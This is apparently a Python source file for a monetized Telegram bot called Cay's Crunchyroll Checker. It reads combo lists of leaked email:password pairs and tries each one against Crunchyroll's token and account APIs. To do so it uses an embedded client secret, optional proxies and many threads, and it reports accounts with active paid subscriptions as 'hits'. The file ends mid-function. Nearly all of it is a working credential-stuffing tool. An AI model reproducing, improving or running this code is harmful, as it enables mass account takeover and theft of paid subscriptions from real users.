from fastapi import FastAPI, Request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import os
import time
import uuid
import requests
import concurrent.futures
from datetime import datetime, date
import asyncio
from functools import partial
from contextlib import asynccontextmanager
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler
from supabase import create_client, Client
from datetime import datetime, date, timedelta
from regions import REGION_HINTS

# ============= CONFIGURATION =============
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7399488750))
CHANNEL_USERNAME = "@caysredirect"

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_ANON_KEY")

TIMEOUT = 30

# ============= PLAN CONFIG (exactly from your screenshot) =============
PLAN_CONFIG = {
    "FREE": {
        "display_name": "FREE",
        "daily_limit": 5000,
        "max_threads": 10,
        "multi_scan_max_files": 1,
        "queue_waiting": True
    },
    "BASIC": {
        "display_name": "BASIC PLAN (WEEKLY)",
        "daily_limit": 25000,
        "max_threads": 75,
        "multi_scan_max_files": 3,
        "queue_waiting": False
    },
    "VIP": {
        "display_name": "VIP PLAN (MONTHLY)",
        "daily_limit": None,
        "max_threads": 125,
        "multi_scan_max_files": 5,
        "queue_waiting": False
    }
}

# ============= PLAN DEFAULTS FOR /setplan COMMAND =============
PLAN_DEFAULTS = {
    "FREE": {
        "plan": "FREE",
        "base_plan_limit": 5000,
        "threads": 10,
        "expires": "N/A"
    },
    "BASIC": {
        "plan": "BASIC",
        "base_plan_limit": 25000,
        "threads": 75,
        "expires": (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d")
    },
    "VIP": {
        "plan": "VIP",
        "base_plan_limit": 999999,   # practically unlimited
        "threads": 125,
        "expires": (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    }
}

# ============= DAYS REMAINING HELPER =============
def get_days_remaining(expires_str: str) -> str:
    """Returns nice countdown text for dashboard and stats"""
    if not expires_str or expires_str.upper() == "N/A":
        return "♾️"  # FREE plan or no expiry
    
    try:
        # Handle both "2026-06-04" and "2026-06-04T..." formats
        date_part = expires_str.split('T')[0]
        expires_date = datetime.strptime(date_part, "%Y-%m-%d").date()
        today = date.today()
        
        delta = (expires_date - today).days
        
        if delta < 0:
            return "❌ Expired"
        elif delta == 0:
            return "Expires today"
        elif delta == 1:
            return "1 day left"
        else:
            return f"{delta} days left"
            
    except Exception:
        # Fallback if date format is weird
        return expires_str

def get_plan_limits(stats: dict):
    """Returns dynamic limits based on user's plan + bonuses"""
    plan_key = stats.get("plan", "FREE").upper()
    config = PLAN_CONFIG.get(plan_key, PLAN_CONFIG["FREE"])
    
    # Base daily limit from plan
    base_limit = config["daily_limit"]
    
    # Add bonuses (daily reward + referral)
    bonus_lines = stats.get("daily_reward_lines", 0) + stats.get("referral_bonus_lines", 0)
    
    if base_limit is None:  # VIP = unlimited
        daily_limit = None
        remaining_text = "♾️"
        base_limit_text = "♾️"
    else:
        daily_limit = base_limit + bonus_lines
        today_used = stats.get("today_scans", 0)
        remaining = max(0, daily_limit - today_used)
        remaining_text = f"{remaining} / {daily_limit}"
        base_limit_text = f"{base_limit:,}"   # e.g. 5,000 or 25,000
    
    return {
        "display_name": config["display_name"],
        "daily_limit": daily_limit,
        "max_threads": config["max_threads"],
        "multi_scan_max_files": config["multi_scan_max_files"],
        "queue_waiting": config["queue_waiting"],
        "remaining_text": remaining_text,
        "current_threads": stats.get("threads", 10),
        "base_limit_text": base_limit_text
    }

# ============= SUPABASE CLIENT =============
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ============= OWNER RESTRICTION =============
def is_owner(update: Update):
    return update.effective_user and update.effective_user.id == ADMIN_ID

# ============= BLOCKING RUNNER =============
async def run_blocking(func, *args, **kwargs):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, partial(func, *args, **kwargs))

# ============= FASTAPI LIFESPAN =============
@asynccontextmanager
async def lifespan(app: FastAPI):
    global tg_app
    await tg_app.initialize()
    await tg_app.start()
    
    webhook_url = os.getenv("WEBHOOK_URL")
    if webhook_url:
        await tg_app.bot.set_webhook(
            url=webhook_url,
            allowed_updates=["message", "edited_message", "channel_post", "callback_query"]
        )
        print(f"✅ Webhook set → {webhook_url}")
    else:
        print("⚠️ WEBHOOK_URL env var is missing!")

    print("🚀 Bot started on Vercel")
    yield

    await tg_app.stop()
    await tg_app.shutdown()

# ============= FASTAPI + TG APP =============
app = FastAPI(lifespan=lifespan)
tg_app = Application.builder().token(BOT_TOKEN).build()

def get_user_stats():
    response = supabase.table("user_stats").select("*").eq("user_id", ADMIN_ID).execute()
    if response.data:
        stats = response.data[0]
        # Auto update last active
        update_user_stats({"last_active": datetime.now().isoformat()})
        return stats
    
    # First time user - create row
    default = {
        "user_id": ADMIN_ID,
        "username": None,
        "first_name": None,
        "registered": str(date.today()),
        "last_active": datetime.now().isoformat(),
        "plan": "FREE",                    # ← changed to FREE by default
        "expires": "N/A",
        "mode": "Crunchyroll",
        "threads": 10,                     # FREE default
        "api_mode": "Crunchyroll",
        "total_scans": 0,
        "total_hits": 0,
        "total_free": 0,
        "total_combo_files": 0,
        "today_date": str(date.today()),
        "today_scans": 0,
        "referrals": 0,
        "referral_code": None,
        "referred_by": None,
        "daily_reward_claimed": False,
        "daily_reward_last_claimed": None,
        "daily_reward_lines": 0,
        "referral_bonus_lines": 0,
        "base_plan_limit": 5000,
        "is_banned": False,
        "created_at": datetime.now().isoformat(),
        "updated_at": datetime.now().isoformat()
    }
    supabase.table("user_stats").insert(default).execute()
    return default

# ============= TELEGRAM BOT HANDLERS =============
def update_user_stats(data: dict):
    data["updated_at"] = datetime.now().isoformat()
    supabase.table("user_stats").update(data).eq("user_id", ADMIN_ID).execute()

def reset_daily_if_needed(stats: dict):
    """Automatically reset daily scans if it's a new day"""
    if stats.get("today_date") != str(date.today()):
        update_user_stats({
            "today_scans": 0,
            "today_date": str(date.today())
        })
        return True  # reset happened
    return False

def update_user_stats_general(user_id: int, data: dict):
    """Update any user (used by admin commands)"""
    data["updated_at"] = datetime.now().isoformat()
    response = supabase.table("user_stats").update(data).eq("user_id", user_id).execute()
    return len(response.data) > 0  # True if row was updated

async def show_support_menu(query, context):
    context.user_data['in_main_menu'] = False
    """Replicates the exact Support & Contact page from your screenshot"""
    
    text = f"""
📞 <b>Support & Contact</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
Need help or want to upgrade?

— Contact: <b>@caydigitals</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━

<a href="https://t.me/caydigitals"><b>Telegram</b></a>
Cay
Main Channel: https://t.me/+MfJaSNxdX5pjNzE9
    """.strip()

    # Inline button that opens direct chat with @caydigitals
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text, 
        parse_mode='HTML', 
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# ============= MEMBERSHIP PLAN MENU (Exact match to your screenshot) =============
async def show_membership_menu(query, context):
    context.user_data['in_main_menu'] = False
    stats = get_user_stats()
    limits = get_plan_limits(stats)
    
    current_plan_text = f"📌 Your Current Plan: <b>{limits['display_name']}</b>"
    
    text = f"""
👑 <b>MEMBERSHIP PLANS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆓 <b>FREE PLAN</b>
• Daily Limit: 5,000 lines
• Max Threads: 1-10
• Single scan at a time
• Queue Waiting System
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>BASIC PLAN (WEEKLY)</b>
• Duration: 7 Days
• Daily Limit: 25,000 lines
• Max Threads: 1-75
• Multi-Scan: Up to 3 files
• No Queue Waiting
• Priority Support
• Price: <b>200 Telegram Stars</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 <b>VIP PLAN (MONTHLY)</b>
• Duration: 30 Days
• Daily Limit: Unlimited lines
• Max Threads: 1-125
• Multi-Scan: Up to 5 files
• No Queue Waiting
• ALL IN ONE Scanner Mode
• Price: <b>600 Telegram Stars</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
{current_plan_text}

⚠️ <b>Payment Method</b>
Telegram Stars only (currently accepted)

💳 To Purchase A Membership
Contact: @caydigitals
    """.strip()

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

# ============= STATISTICS MENU (Exact match to your screenshot) =============
async def show_statistics_menu(query, context):
    context.user_data['in_main_menu'] = False
    stats = get_user_stats()
    
    # Auto reset daily stats if new day
    if stats["today_date"] != str(date.today()):
        update_user_stats({"today_scans": 0, "today_date": str(date.today())})
        stats = get_user_stats()  # Refresh after reset
    
    limits = get_plan_limits(stats)   # ← MOVED OUTSIDE the if-block

    success_rate = round((stats["total_hits"] / stats["total_scans"] * 100), 2) if stats["total_scans"] > 0 else 0.0

    text = f"""
📊 <b>Your Statistics</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> <code>{stats['user_id']}</code>
📅 <b>Registered:</b> <code>{stats['registered']}</code>
👑 <b>Plan:</b> <code>{stats['plan']}</code>
📆 <b>Plan Expires In:</b> <code>{get_days_remaining(stats['expires'])}</code>
📡 <b>Mode:</b> <code>{stats['mode']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🧵 <b>Threads:</b> <code>{limits['current_threads']} / {limits['max_threads']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 <b>General Statistics:</b>
✅ Total Scans: <code>{stats['total_scans']}</code>
💎 Total Hits: <code>{stats['total_hits']}</code>
❌ Total Bad: <code>{stats.get('total_free', 0)}</code>
🎯 Success Rate: <code>{success_rate}%</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Today's Statistics:</b>
📊 Scans Used: <code>{stats['today_scans']}</code>
⏳ Remaining: <code>{limits['remaining_text']}</code>
👥 Referrals: <code>{stats['referrals']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Rewards & Limits Details:</b>
🎟️ Claimed Codes: <code>0</code>
🎁 Daily Reward Claimed Today: <code>{'Yes' if stats['daily_reward_claimed'] else 'No'}</code>
✨ Daily Reward Lines (Active): <code>{stats['daily_reward_lines']}</code>
👥 Referral Bonus Lines: <code>+{stats['referral_bonus_lines']}</code>
📦 Base Plan Limit: <code>{limits['base_limit_text']}</code>
    """.strip()

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

async def set_plan_command(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ This command is only for the owner.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "📋 <b>Usage:</b>\n\n"
            "<code>/setplan VIP</code> → update yourself\n"
            "<code>/setplan 1234567890 VIP</code> → update by user ID\n"
            "<code>/setplan @username VIP</code> → update by username\n\n"
            "Available plans: FREE, BASIC, VIP",
            parse_mode='HTML'
        )
        return

    # Determine target and plan
    if len(args) == 1:
        # /setplan VIP  → self
        target_user_id = ADMIN_ID
        new_plan = args[0].strip().upper()
    elif len(args) == 2:
        target = args[0].strip()
        new_plan = args[1].strip().upper()

        if target.startswith('@'):
            # By username
            username = target[1:]  # remove @
            response = supabase.table("user_stats").select("user_id").eq("username", username).execute()
            if not response.data:
                await update.message.reply_text(f"❌ User with username @{username} not found.")
                return
            target_user_id = response.data[0]["user_id"]
        else:
            # By user_id
            try:
                target_user_id = int(target)
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID or username format.")
                return
    else:
        await update.message.reply_text("❌ Wrong usage. Check /setplan for help.")
        return

    if new_plan not in PLAN_DEFAULTS:
        await update.message.reply_text("❌ Invalid plan! Use: FREE, BASIC, or VIP")
        return

    defaults = PLAN_DEFAULTS[new_plan]

    update_data = {
        "plan": defaults["plan"],
        "base_plan_limit": defaults["base_plan_limit"],
        "threads": defaults["threads"],
        "expires": defaults["expires"],
        "daily_reward_lines": 0,
        "referral_bonus_lines": 0
    }

    success = update_user_stats_general(target_user_id, update_data)

    if success:
        await update.message.reply_text(
            f"✅ <b>Plan updated successfully!</b>\n\n"
            f"👤 Target User: <code>{target_user_id}</code>\n"
            f"📌 New Plan: <b>{new_plan}</b>\n"
            f"🧵 Threads: <b>{defaults['threads']}</b>\n"
            f"📆 Expires: <b>{defaults['expires']}</b>\n\n"
            f"Changes are live immediately.",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text("❌ Failed to update user. Make sure the user has used the bot before.")

async def show_settings_menu(query, context):
    context.user_data['in_main_menu'] = False
    """Replicates the exact Settings Menu"""
    # ←←← IMPORTANT: Clear waiting state when returning from Set Threads
    if 'waiting_for_threads' in context.user_data:
        context.user_data['waiting_for_threads'] = False

    stats = get_user_stats()
    limits = get_plan_limits(stats)
    
    settings_text = f"""
⚙️ <b>Settings Menu</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
Configure your bot preferences below:

🧵 <b>Threads</b>: Control scan speed
Current: <b>{limits['current_threads']} threads</b> (Max: {limits['max_threads']})

🔌 <b>API Mode</b>: Select scanning method
Current: <b>Crunchyroll</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Click a button to configure:</i>
    """.strip()
    
    keyboard = [
        [
            InlineKeyboardButton("🧵 Set Threads", callback_data="set_threads"),
            InlineKeyboardButton("🔌 API Mode", callback_data="set_api_mode"),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        settings_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def handle_set_threads(query, context):
    context.user_data['in_main_menu'] = False
    stats = get_user_stats()
    limits = get_plan_limits(stats)
    plan = limits["display_name"]
    max_t = limits["max_threads"]
    
    text = f"""
<b>Set Thread Count</b>

Limits by plan:
🆓 FREE: 1-10
⭐ BASIC: 1-75
👑 VIP: 1-125

Your plan <b>{plan}</b> allows 1-{max_t} threads.

Current threads: <b>{limits['current_threads']}</b>

Send a number between 1 and {max_t} to set your thread count.
    """.strip()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
    context.user_data['waiting_for_threads'] = True

async def handle_api_mode(query, context):
    context.user_data['in_main_menu'] = False
    """Placeholder for API Mode (you can expand later without touching checker)"""
    text = f"""
<b>API Mode</b>

Current scanning method: <b>Crunchyroll</b> ✅

Other modes (Netflix, etc.) coming soon...
    """.strip()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

def format_single_result(result):
    """Returns nicely formatted HTML for single account check"""

    # Get flag from your regions.py
    country_code = result.get('country', 'ZZ').upper()
    flag = REGION_HINTS.get(country_code, "🌍")

    # Full country name mapping (common ones)
    country_names = {
        "BR": "Brazil",
        "US": "United States",
        "MX": "Mexico",
        "CL": "Chile",
        "FR": "France",
        "DE": "Germany",
        "IT": "Italy",
        "ES": "Spain",
        "GB": "United Kingdom",
        "CA": "Canada",
        "AU": "Australia",
        "AR": "Argentina",
        "CO": "Colombia",
        "PE": "Peru",
        "UY": "Uruguay",
        "ZA": "South Africa",
        "TR": "Turkey",
        "NO": "Norway",
        "NZ": "New Zealand",
        "CR": "Costa Rica",
        "ZZ": "Unknown",
    }

    country_name = country_names.get(country_code, country_code)
    country_display = f"{country_name} {flag}"

    if result['success']:
        return f"""
✅ <b>HIT FOUND!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
────────────────
📊 <b>Account Details</b>
• <b>Verified:</b> <code>{result['email_verified']}</code>
• <b>Created:</b> <code>{result['account_creation'] or 'N/A'}</code>
• <b>Plan:</b> <code>{result['plan']}</code>
• <b>Currency:</b> <code>{result['currency'] or 'N/A'}</code>
• <b>Subscribable:</b> <code>{result['subscribable']}</code>
• <b>Free Trial:</b> <code>{result['free_trial']}</code>
• <b>Expiry:</b> <code>{result['expiry'] or 'N/A'}</code>
• <b>Active:</b> <code>✅ {result['active']}</code>
• <b>Country:</b> <code>{country_display}</code>

┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
Channel: {CHANNEL_USERNAME}
        """.strip()
    else:
        return f"""
❌ <b>CHECK FAILED</b>

📧 <b>Email:</b> <code>{result['email']}</code>

📌 <b>Status:</b> {result['message']}

Try another account!
        """.strip()

def check_crunchyroll(email, password, proxy=None):
    """Improved version with better error messages"""
    result = {
        'email': email,
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'No',
        'account_creation': '',
        'plan': 'None',
        'currency': '',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': '',
        'active': 'False',
        'country': 'Unknown'
    }
    
    max_retries = 2
    
    for attempt in range(max_retries + 1):
        try:
            # Step 1: Get Access Token
            device_id = str(uuid.uuid4())
            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            token_data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access",
                "client_id": "y2arvjb0h0rgvtizlovy",
                "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
                "device_type": "BotChecker",
                "device_id": device_id,
                "device_name": "CrunchyBot"
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
            }
            
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
            
            if resp.status_code != 200:
                error_text = resp.text.lower()

                if "two_factor" in error_text or "2fa" in error_text or "otp_required" in error_text or "verification_code" in error_text:
                    result['message'] = "2FA / OTP Required"
                elif "invalid_credentials" in error_text or "invalid username or password" in error_text:
                    result['message'] = "Invalid email or password"
                elif "account locked" in error_text or "locked" in error_text:
                    result['message'] = "Account is locked"
                elif resp.status_code == 429:
                    result['message'] = "Too many attempts (rate limited)"
                elif resp.status_code == 403:
                    result['message'] = "Access forbidden"
                else:
                    result['message'] = f"Login failed (HTTP {resp.status_code})"

                if attempt < max_retries:
                    time.sleep(1.5)
                    continue
                result['message'] = f"HTTP {resp.status_code}"
                return result
                
            token_data = resp.json()
            access_token = token_data.get('access_token')
            
            if not access_token:
                if 'invalid_credentials' in resp.text.lower():
                    result['message'] = "Invalid email or password"
                    return result
                elif attempt < max_retries:
                    time.sleep(1.5)
                    continue
                else:
                    result['message'] = "Failed to get access token"
                    return result
            
            # Step 2: Get Account Info
            acc_headers = {'Authorization': f'Bearer {access_token}', 'User-Agent': headers['User-Agent']}
            acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=acc_headers, proxies=proxies, timeout=25)
            
            if acc_resp.status_code == 200:
                acc_data = acc_resp.json()
                result['email_verified'] = 'Yes' if acc_data.get('email_verified') else 'No'
                created = acc_data.get('created', '')
                if created:
                    result['account_creation'] = created.split('T')[0]
                external_id = acc_data.get('external_id')
                
                if external_id:
                    # Step 3: Subscription
                    subs_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", 
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if subs_resp.status_code == 200:
                        subs_data = subs_resp.json()
                        result['active'] = 'Yes' if subs_data.get('is_active') else 'No'
                        result['expiry'] = subs_data.get('next_renewal_date', '').split('T')[0] if subs_data.get('next_renewal_date') else ''
                        result['country'] = subs_data.get('country_code', 'Unknown')
                    
                    # Step 4: Products
                    prod_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", 
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if prod_resp.status_code == 200:
                        items = prod_resp.json().get('items', [])
                        if items:
                            product = items[0].get('product', {})
                            result['plan'] = product.get('sku', 'None')
                            result['currency'] = items[0].get('currency_code', '')
                            result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'No'
                            result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'No'
            
            # Final decision
            if result['active'] == 'Yes' and result['subscribable'] == 'Yes':
                result['success'] = True
                result['message'] = 'ACTIVE SUBSCRIPTION!'
            else:
                result['success'] = False
                result['message'] = 'Valid account but no paid plan'
            
            return result   # Success on this attempt
            
        except Exception as e:
            if attempt < max_retries:
                time.sleep(2)
                continue
            result['message'] = f'Error: {str(e)[:80]}'
            return result
    
    return result

async def start(update: Update, context: CallbackContext):
    context.user_data['in_main_menu'] = True
    if not is_owner(update):
        await update.message.reply_text("❌ This bot is private.", parse_mode='HTML')
        return
    
    stats = get_user_stats()
    reset_daily_if_needed(stats)
    stats = get_user_stats()

    limits = get_plan_limits(stats)
    
    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = f"""
<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 <b>Send your combo list (.txt file)</b>
<i>Format: mail:pass (one per line)</i>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{limits['current_threads']}/{limits['max_threads']}</b></code>
👑 Plan: <code><b>{limits['display_name']}</b></code>
📅 Days Left: <code><b>{get_days_remaining(stats['expires'])}</b></code>
📈 Daily Limit: <code><b>{limits['remaining_text']}</b></code>
📡 Mode: <code><b>Crunchyroll Check</b></code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    await update.message.reply_text(
        welcome,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def process_thread_count_input(update: Update, context: CallbackContext):
    """Handles number input after clicking 'Set Threads'"""
    text = update.message.text.strip()
    
    try:
        new_threads = int(text)
        stats = get_user_stats()
        limits = get_plan_limits(stats)
        max_allowed = limits["max_threads"]
        plan_name = limits["display_name"]

        if 1 <= new_threads <= max_allowed:
            # Update in database
            update_user_stats({
                "threads": new_threads
            })
            
            # Show confirmation
            await update.message.reply_text(
                f"✅ <b>Thread count updated to {new_threads} for your account.</b>",
                parse_mode='HTML'
            )
            
            # Clear waiting state
            context.user_data['waiting_for_threads'] = False
            
            # Redirect back to main menu
            await edit_to_main_menu(update, context)
            
        else:
            await update.message.reply_text(
                f"❌ Your plan <b>({plan_name})</b> allows a maximum of <b>{max_allowed}</b> threads.",
                parse_mode='HTML'
            )
            return

    except ValueError:
        await update.message.reply_text(
            "❌ Invalid number! Send a number only.",
            parse_mode='HTML'
        )
        return

async def handle_message(update: Update, context: CallbackContext):
    if not is_owner(update):
        return
    
    text = update.message.text.strip()
    
    # Priority: Waiting for thread count input
    if context.user_data.get('waiting_for_threads'):
        await process_thread_count_input(update, context)
        return
    
    is_on_main_menu = context.user_data.get('in_main_menu', False)
    looks_like_combo = ':' in text and '@' in text
    
    # 🔥 NEW: Only trigger single checker when on the main dashboard
    if is_on_main_menu:
        if looks_like_combo:

            parts = text.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            
            stats = get_user_stats()
            reset_daily_if_needed(stats)
            stats = get_user_stats()
            limits = get_plan_limits(stats)
            
            if limits["daily_limit"] is not None:
                if stats["today_scans"] + 1 > limits["daily_limit"]:
                    await update.message.reply_text(
                        f"❌ Daily limit reached!\n"
                        f"You have already used {stats['today_scans']}/{limits['daily_limit']} scans today.\n"
                        f"Upgrade your plan or wait until tomorrow.",
                        parse_mode='HTML'
                    )
                    return
            
            status_msg = await update.message.reply_text(
                f"🔍 Checking <code>{email}</code>...\nPlease wait...", 
                parse_mode='HTML'
            )
            
            result = await run_blocking(check_crunchyroll, email, password)
            
            response = format_single_result(result)
            await status_msg.edit_text(response, parse_mode='HTML')
            
            # 🔥 AUTO PIN THE RESULT
            await manage_result_pin(update, context, status_msg.message_id)
            
            hits_increment = 1 if result['success'] else 0
            bad_increment = 1 if not result['success'] else 0
            
            update_user_stats({
                "total_scans": stats["total_scans"] + 1,
                "total_hits": stats["total_hits"] + hits_increment,
                "total_free": stats.get("total_free", 0) + bad_increment,
                "today_scans": stats["today_scans"] + 1
            })
            return
        else:
            await update.message.reply_text(
                """❌ <b>Invalid Format!</b>
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━
    Send like this:
    <code>email:password</code>
    <b>Example:</b>
    <code>user@example.com:supersecret123</code>
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━
    💡 You can also send a <b>.txt file</b> with multiple accounts (one per line).""",
                parse_mode='HTML'
            )
            return
    else:
        warning = await update.message.reply_text(
            """🚧 You can only check accounts from the home dashboard.""",
            parse_mode='HTML'
        )
        await asyncio.sleep(3)
        await warning.delete()
        return

async def handle_document(update: Update, context: CallbackContext):
    if not is_owner(update):
        return
    
    document = update.message.document

    # Check if user is on the main dashboard
    is_on_main_menu = context.user_data.get('in_main_menu', False)
    
    if not is_on_main_menu:
        warning = await update.message.reply_text(
            """🚧 You can only check accounts from the home dashboard.""",
            parse_mode='HTML'
        )
        await asyncio.sleep(3)
        await warning.delete()
        return
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file only!", parse_mode='HTML')
        return
    
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    lines = file_content.decode('utf-8', errors='ignore').splitlines()
    
    accounts = []
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append((email.strip(), pwd.strip()))
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found!", parse_mode='HTML')
        return
    
    total = len(accounts)
    hits = []
    start_time = time.time()

    # === Get fresh limits from database (no global needed) ===
    stats = get_user_stats()
    reset_daily_if_needed(stats)
    stats = get_user_stats()
    limits = get_plan_limits(stats)
    user_threads = limits["current_threads"]

    progress_msg = await update.message.reply_text(
        f"🚀 Starting bulk check with <b>{user_threads}</b> threads...\n"
        f"0/{total} completed (0%)", 
        parse_mode='HTML'
    )

    # Daily limit check (already good)
    if limits["daily_limit"] is not None:
        if stats["today_scans"] + total > limits["daily_limit"]:
            await update.message.reply_text(
                f"❌ Daily limit reached!\n"
                f"You have already used {stats['today_scans']}/{limits['daily_limit']} scans today.\n"
                f"Upgrade your plan or wait until tomorrow.",
                parse_mode='HTML'
            )
            return
    
    def check_account(acc):
        email, pwd = acc
        return check_crunchyroll(email, pwd)
    
    completed = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=user_threads) as executor:
        future_to_acc = {executor.submit(check_account, acc): acc for acc in accounts}
        
        for future in concurrent.futures.as_completed(future_to_acc):
            result = future.result()
            completed += 1
            
            if result['success']:
                hits.append(result)
            
            if completed % 5 == 0 or completed == total:
                try:
                    percent = int((completed / total) * 100)
                    await progress_msg.edit_text(
                        f"🚀 Checking with {user_threads} threads...\n"
                        f"{completed}/{total} completed ({percent}%)",
                        parse_mode='HTML'
                    )
                except:
                    pass
    
    # ====================== UPDATE SUPABASE STATS ======================
    hits_count = len(hits)
    bad_count = total - hits_count
    
    # Get current stats and update
    current_stats = get_user_stats()
    
    update_user_stats({
        "total_scans": current_stats["total_scans"] + total,
        "total_hits": current_stats["total_hits"] + hits_count,
        "total_free": current_stats.get("total_free", 0) + bad_count,   # ← Now tracks BAD
        "today_scans": current_stats["today_scans"] + total
    })

    # ====================== SUMMARY ======================
    elapsed = int(time.time() - start_time)
    cpm = int((total / elapsed) * 60) if elapsed > 0 else 0
    
    summary = f"""
<b>📊 Scan Completed ✅</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 <b>File:</b> <code>{document.file_name}</code>
📊 <b>Processed:</b> <code>{completed}/{total}</code>
🧵 <b>Threads:</b> <code>{user_threads}</code>
📡 Mode: <code>{stats['mode']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>HITS:</b> <code>{hits_count}</code>
❌ <b>BAD:</b> <code>{bad_count}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏱ <b>Elapsed:</b> <code>{elapsed}s</code>
⚡ <b>CPM:</b> <code>{cpm}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    await progress_msg.edit_text(summary, parse_mode='HTML')

    # 🔥 AUTO PIN THE BULK RESULT SUMMARY
    await manage_result_pin(update, context, progress_msg.message_id)
    
    # ====================== SEND RESULTS FILES ======================
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # 1. Send HITS file (only if hits found)
    if hits_count > 0:
